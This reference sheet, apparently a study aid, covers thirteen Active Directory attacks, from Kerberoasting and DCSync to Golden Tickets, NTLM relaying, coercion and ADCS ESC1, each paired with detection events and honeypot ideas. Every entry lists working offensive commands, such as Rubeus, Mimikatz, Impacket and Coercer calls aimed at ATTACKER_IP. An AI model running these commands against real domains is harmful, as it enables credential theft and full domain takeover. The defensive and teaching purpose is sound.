01 Kerberoasting KERBEROS T1558.003 ▶
◈ What

Any domain user can request a Kerberos TGS ticket for any account with a registered SPN. The ticket is encrypted with the service account's NTLM password hash. The attacker extracts the ticket and cracks the hash offline — no special rights required. Encryption downgrades to RC4 are possible even in AES environments by manipulating the request.

◈ How to Exploit
  • Enumerate SPNs with Rubeus kerberoast or Get-SPNs
  • Request all TGS tickets at once: Rubeus.exe kerberoast /outfile:spn.txt
  • RC4 downgrade: /rc4opsec flag on Rubeus
  • Crack offline: hashcat -m 13100 (RC4) or -m 19600 (AES)
  • Impacket alternative: GetUserSPNs.py domain/user:pass
◈ Detection

4769 generated per TGS request — extremely high volume, not useful alone. Alert on: bulk TGS requests (10+ tickets/min from single source). Alert when Ticket Encryption Type = RC4 (0x17) in environments enforcing AES. Honeypot SPN user: any TGS for that account = alert.

TOOLS: RubeusImpacket GetUserSPNsPowerViewhashcat
02 AS-REProasting KERBEROS T1558.004 ▶
◈ What

Targets accounts with "Do not require Kerberos preauthentication" enabled (DONT_REQ_PREAUTH). Without preauth, the KDC returns an AS-REP containing encrypted material derivable from the account's password — no authentication needed to request it. Crackable offline identical to Kerberoasting but requires no credentials at all in some tool implementations.

◈ How to Exploit
  • Extract all vulnerable hashes: Rubeus.exe asreproast /outfile:asrep.txt
  • Target specific user: Rubeus.exe asreproast /user:anni
  • Unauthenticated (no creds): GetNPUsers.py domain/ -usersfile users.txt
  • Crack: hashcat -m 18200 (Kerberos 5 AS-REP etype 23)
◈ Detection

4768 (TGT requested). Key field: Pre-Authentication Type = 0 (no preauth). Also watch Ticket Encryption Type = 0x17 (RC4). Volume is high for normal logins — correlate source IP to known user location/VLAN. Honeypot user with DONT_REQ_PREAUTH: any AS-REP request = high-fidelity alert.

TOOLS: RubeusImpacket GetNPUsershashcat
03 GPP Passwords (MS14-025) CRED EXPOSURE T1552.006 ▶
◈ What

Group Policy Preferences stored passwords in XML files in SYSVOL (\\DOMAIN\SYSVOL\...) encrypted with AES-256 — but Microsoft published the private key on MSDN. SYSVOL is readable by all Authenticated Users. Affected XML files contain a cpassword attribute. Despite the 2014 patch (KB2962486), legacy environments still contain these. Credentials persist until the file is removed.

◈ How to Exploit
  • Auto-parse and decrypt: Get-GPPPassword (PowerSploit)
  • Manual: parse XML files in \\DOMAIN\SYSVOL\...\Policies\
  • Decrypt cpassword value with public AES key (known)
  • CrackMapExec: cme smb DC -u user -p pass -M gpp_password
◈ Detection

Enable SACL auditing on the XML files in SYSVOL. Any read generates 4663. Also monitor for logon attempts with the exposed account: 4624 (success), 4625 (fail), 4768 (TGT). Honeypot: wrong password in GPP XML → failed auth events are IOC.

TOOLS: Get-GPPPasswordCrackMapExecImpacket
04 GPO Permissions / GPO File Abuse PRIVESC T1484.001 ▶
◈ What

GPOs misconfigured to allow write access to low-privileged users (e.g., "Authenticated Users" or "Domain Users" on a GPO). Any user with write permissions can modify GPO settings to add startup scripts, scheduled tasks, or deploy malicious files — affecting all systems in the linked OU. Also covers cases where deployed script files on shares have weak NTFS permissions, allowing binary replacement.

◈ How to Exploit
  • Enumerate writable GPOs: Get-GPPermission or BloodHound
  • Add startup script/scheduled task via GPMC or manual XML edit
  • Target: replace deployed binary on misconfigured share
  • SharpGPOAbuse: SharpGPOAbuse.exe --AddLocalAdmin --GPOName "..."
  • Impact reaches all OUs the vulnerable GPO is linked to
◈ Detection

Enable Directory Service Changes auditing. GPO modification generates 5136 (DS object modified). Alert on any non-admin account appearing as the modifier. Also monitor deployed file hashes for changes (hash-based integrity alerting). Honeypot GPO linked to non-critical OU with auto-disable and GPO unlink on modification.

TOOLS: SharpGPOAbuseBloodHoundPowerView
05 Credentials in Network Shares CRED EXPOSURE T1552.001 ▶
◈ What

Cleartext or recoverable credentials stored in scripts, config files, or documents on network shares accessible to Domain Users. Common sources: batch files, PowerShell scripts, .conf/.ini/.config files, connection strings. "Hidden" shares (ending in $) are not hidden to enumeration tools — only Windows Explorer omits them. Adding "Users" to a share ACL grants all domain users access.

◈ How to Exploit
  • Enumerate accessible shares: Invoke-ShareFinder -ExcludeStandard -CheckShareAccess
  • Search file contents: Invoke-FileFinder, snaffler, manual grep
  • Target file types: .ps1 .bat .cmd .config .ini .xml .txt .xlsx
  • Look for keywords: password, pass, pwd, credential, secret, key
◈ Detection

Behaviour baselining: alert on simultaneous connections from a workstation to many hosts (e.g., Invoke-ShareFinder scanning hundreds of devices). Monitor privileged account logons from unexpected sources: 4624, 4625, 4768. Honeypot: fake cred file on accessible share with wrong password; failed auth events = IOC.

TOOLS: Invoke-ShareFinderSnafflerInvoke-FileFinder
06 Credentials in Object Properties CRED EXPOSURE T1552.004 ▶
◈ What

Admins storing passwords in AD user object properties — typically the Description or Info fields — under the false assumption that read access requires elevated AD rights. In reality, all domain users can read most object properties including these. Frequently affects service accounts created manually where the creator notes the password in the description.

◈ How to Exploit
  • Enumerate via PowerShell: Get-ADUser -Filter * -Properties Description,Info
  • Search for keywords: pass, pwd, key, admin
  • PowerSploit: SearchUserClearTextInformation -Terms "pass"
  • BloodHound also surfaces this in node property views
◈ Detection

Event 4738 fires when a user object is modified but does not specify which property changed — limited utility. Behaviour baseline: alert on privileged/service account logons from unexpected hosts/times: 4624, 4625, 4768. Honeypot: fake password in Description on a service account; failed auth = 4625, 4771, 4776.

TOOLS: Get-ADUserBloodHoundLDAP queries
07 DCSync PRIVESC T1003.006 ▶
◈ What

Abuses the AD replication protocol (MS-DRSR) to request password hashes from a DC without requiring local admin on the DC itself. Requires the attacking account to hold "Replicating Directory Changes" + "Replicating Directory Changes All" permissions (normally only DCs and Azure AD Connect). Can dump any account including krbtgt and Administrator.

◈ How to Exploit
  • Mimikatz: lsadump::dcsync /domain:eagle.local /user:Administrator
  • Dump krbtgt for Golden Ticket: /user:krbtgt
  • Impacket: secretsdump.py domain/user:pass@DC_IP
  • Pre-req: compromise account with replication rights (or DA)
◈ Detection

4662 generated on every DC replication. Filter on property GUIDs: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 or 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2. Alert when initiator is NOT a DC computer account. Whitelist Azure AD Connect and legitimate DC accounts. This is one of the highest-fidelity AD detections available.

TOOLS: MimikatzImpacket secretsdumpCrackMapExec
08 Golden Ticket KERBEROS T1558.001 ▶
◈ What

Using the krbtgt NTLM hash (obtained via DCSync or LSASS dump) to forge valid TGTs for any user, including Domain Admins, bypassing normal Kerberos authentication. The forged ticket is signed by krbtgt and the entire domain trusts it unconditionally. Provides cross-domain escalation within a forest. Enables long-term persistence — tickets can be forged on demand even after password resets (until krbtgt is reset twice).

◈ How to Exploit
  • Obtain krbtgt hash via DCSync first
  • Mimikatz: kerberos::golden /domain: /sid: /rc4: /user: /id:500
  • Set realistic lifetime: /endin:600 /renewmax:10080
  • Inject: kerberos::ptt ticket.kirbi
  • Impacket: ticketer.py -nthash krbtgt_hash -domain-sid S-1-5-... -domain domain.local Administrator
◈ Detection

No event on the DC when ticket is forged. Detection: 4624/4625 on target systems — alert when privileged accounts authenticate from non-PAW machines. TGS requests without a preceding TGT (possible indicator). Cross-domain escalation: 4675 (SID Filtering). Default Mimikatz ticket lifetime (10 years) is trivially detectable by EDRs — watch for MaxTicketAge violations.

TOOLS: MimikatzImpacket ticketerRubeus REMEDIATION: Reset krbtgt password TWICE, 10hr apart
09 Kerberos Constrained Delegation Abuse KERBEROS T1558 ▶
◈ What

Constrained Delegation allows a service account to obtain Kerberos tickets on behalf of any user to specific services via S4U2Proxy. If the account is also trusted for Protocol Transition (S4U2Self), an attacker with control of that account can impersonate any user — including DA — to the configured services. Protocol transition also permits pivoting to services not listed in the delegation config (e.g., trusted for LDAP → get CIFS ticket).

◈ How to Exploit
  • Enumerate: Get-NetUser -TrustedToAuth (PowerView)
  • Rubeus S4U: Rubeus.exe s4u /user:web_service /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/DC1
  • Protocol transition allows delegation to any service if TRUSTED_TO_AUTH_FOR_DELEGATION is set
  • Inject ticket: Rubeus.exe ptt /ticket:...
◈ Detection

S4U logon events show the delegating account under Transited Services in 4624. Alert on: privileged user (Administrator, DA) authenticating from non-PAW workstation. Unusual source for S4U service tickets. Monitor msDS-AllowedToDelegateTo attribute changes on accounts.

TOOLS: RubeusPowerViewImpacket getST
10 PrintSpooler Bug & NTLM Relaying NTLM T1187 / T1557.001 ▶
◈ What

The Print Spooler service's RpcRemoteFindFirstPrinterChangeNotification(Ex) RPC functions allow any domain user to force a remote machine to authenticate back to an attacker-controlled host, carrying a TGT (NTLM or Kerberos). Microsoft treats this as "by design." The forced authentication can be relayed to another DC (DCSync via NTLMRelayx if SMB signing is off), ADCS for a DC certificate, or to configure RBCD.

◈ How to Exploit
  • Setup relay: impacket-ntlmrelayx -t dcsync://DC2_IP -smb2support
  • Trigger: python3 dementor.py ATTACKER_IP DC_IP -u user -d domain -p pass
  • Requires SMB Signing disabled on target DC
  • Alternative target: relay to ADCS for DC cert (-t http://PKI/certsrv)
  • Check SMB Signing: cme smb DC_IP --gen-relay-list
◈ Detection

No 4662 generated when NTLMRelayx relays DCSync (traffic impersonates DC). Watch for: 4624 successful logon for a DC computer account originating from a non-DC IP. Correlate DC computer account logons to their known static IPs. Firewall logs: outbound DC connections to port 445/139 to non-DC hosts = suspicious. Disable Print Spooler on DCs where not required.

TOOLS: DementorSpoolSampleNTLMRelayxResponder
11 Coercing Attacks & Unconstrained Delegation NTLM KERBEROS T1187 / T1558 ▶
◈ What

Coercer tool exploits multiple RPC functions simultaneously (PetitPotam, DFSCoerce, ShadowCoerce, etc.) to force DC authentication back to an attacker. When a server with Unconstrained Delegation (UD) is already compromised, the DC's TGT is cached in LSASS of the UD machine and can be extracted/exported. This escalates from any user to DA in virtually every default AD deployment. Coercing is also used to relay to ADCS (ESC8).

◈ How to Exploit
  • Find UD hosts: Get-NetComputer -Unconstrained (PowerView)
  • On UD machine: Rubeus.exe monitor /interval:1 to capture incoming TGTs
  • Coerce from Kali: Coercer -u user -p pass -d domain -l ATTACKER_IP -t DC_IP
  • Extract captured TGT with Rubeus, inject with ptt
  • Then perform DCSync with the DC's TGT
◈ Detection

No native Windows event for RPC coercing. Best options: host firewall logs showing DC outbound connections to attacker on port 445/139 — inbound connects followed by outbound to non-DC IP is the coerce pattern. Block outbound 139/445 from DCs to non-DC hosts. Third-party: RPC Firewall (Zero Networks) for granular RPC function monitoring. Unexpected TGT logons at UD servers from DC computer accounts.

TOOLS: CoercerPetitPotamRubeus monitorMimikatz
12 Object ACL Abuse ACL ABUSE T1222.001 ▶
◈ What

Misconfigured ACEs on AD objects granting low-privileged users elevated rights: GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMember. Common paths: user can write SPN (→ Kerberoast any account), user can reset another account's password, user has GenericAll on a group (→ add themselves). BloodHound maps these attack paths graphically.

◈ How to Exploit
  • Enumerate: SharpHound + BloodHound (-c All); PowerView Get-DomainObjectACL
  • Add SPN to target: Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/SPN'}
  • Reset password: Set-ADAccountPassword (if ForceChangePassword)
  • Add to group: Add-DomainGroupMember
  • WriteDACL: grant yourself DCSync rights, then DCSync
◈ Detection

Object modified: 4738 (user changed) — does not show which attribute. 4724 if ACL abuse leads to password reset. 4742 for computer object changes. Alert on non-admin accounts modifying objects. Naming convention baseline: changes by accounts outside admin naming patterns = suspicious. Honeypot: ACL-misconfigured object that no one should touch.

TOOLS: BloodHoundSharpHoundPowerViewImpacket dacledit
13 PKI Misconfiguration — ESC1 PKI T1649 ▶
◈ What

ESC1 (from SpecterOps "Certified Pre-Owned"): an enrollable certificate template with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT set, Client Authentication EKU, and no manager approval. Allows any low-privileged user to request a certificate for any UPN (e.g., Administrator@domain), then use that cert for Kerberos auth (PKINIT) to get a TGT as that user. Certificates are valid 1+ years and remain valid through password resets.

◈ How to Exploit
  • Find vulnerable templates: Certify.exe find /vulnerable
  • Request cert for DA: Certify.exe request /ca:CA /template:VulnTemplate /altname:Administrator
  • Convert to PFX: openssl pkcs12 -in cert.pem -keyex -CSP "..." -export
  • Get TGT: Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx
  • Enumerate via: certipy find -u user@domain -p pass -dc-ip DC
◈ Detection

Events on the CA server (not DC): 4886 (certificate requested) and 4887 (certificate issued). These alone don't reveal the SAN — inspect the cert itself or use certutil -view to find SAN fields on issued certs. Alert on 4768 with certificate authentication (PKINIT) where the requestor differs from their normal logon pattern. Automate: parse CA-issued certs for SAN != Subject mismatches.

TOOLS: CertifyCertipyRubeuscertutil NOTE: Events 4886/4887 log to CA, not DC
